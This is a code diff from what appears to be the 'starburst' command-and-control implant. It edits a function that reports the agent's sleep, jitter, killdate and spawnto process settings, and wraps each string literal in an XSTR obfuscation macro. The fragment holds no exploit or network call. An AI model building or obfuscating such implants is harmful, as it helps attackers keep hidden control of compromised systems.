@@ -59,37 +59,37 @@ auto declfn starburst::cmd_config(
     char result[800] = { 0 };
     char tmp[32]     = { 0 };
 
-    str_copy( result, symbol<char*>( const_cast<char*>( "sleep=" ) ) );
+    str_copy( result, XSTR( "sleep=" ) );
     int_to_str( tmp, inst.agent.sleep_ms, 10 );
     str_concat( result, tmp );
 
-    str_concat( result, symbol<char*>( const_cast<char*>( " jitter=" ) ) );
+    str_concat( result, XSTR( " jitter=" ) );
     int_to_str( tmp, inst.agent.jitter_pct, 10 );
     str_concat( result, tmp );
 
-    str_concat( result, symbol<char*>( const_cast<char*>( " killdate=" ) ) );
+    str_concat( result, XSTR( " killdate=" ) );
     int_to_str( tmp, inst.agent.killdate, 10 );
     str_concat( result, tmp );
 
-    str_concat( result, symbol<char*>( const_cast<char*>( "\nspawnto_x64=" ) ) );
+    str_concat( result, XSTR( "\nspawnto_x64=" ) );
     if ( inst.spawnto.x64[0] )
         str_concat( result, inst.spawnto.x64 );
     else
-        str_concat( result, symbol<char*>( const_cast<char*>( "(not set)" ) ) );
+        str_concat( result, XSTR( "(not set)" ) );
 
     if ( inst.spawnto.x64_args[0] ) {
-        str_concat( result, symbol<char*>( const_cast<char*>( " " ) ) );
+        str_concat( result, XSTR( " " ) );
         str_concat( result, inst.spawnto.x64_args );
     }
 
-    str_concat( result, symbol<char*>( const_cast<char*>( "\nspawnto_x86=" ) ) );
+    str_concat( result, XSTR( "\nspawnto_x86=" ) );
     if ( inst.spawnto.x86[0] )
         str_concat( result, inst.spawnto.x86 );
     else
-        str_concat( result, symbol<char*>( const_cast<char*>( "(not set)" ) ) );
+        str_concat( result, XSTR( "(not set)" ) );
 
     if ( inst.spawnto.x86_args[0] ) {
-        str_concat( result, symbol<char*>( const_cast<char*>( " " ) ) );
+        str_concat( result, XSTR( " " ) );
         str_concat( result, inst.spawnto.x86_args );
     }
 
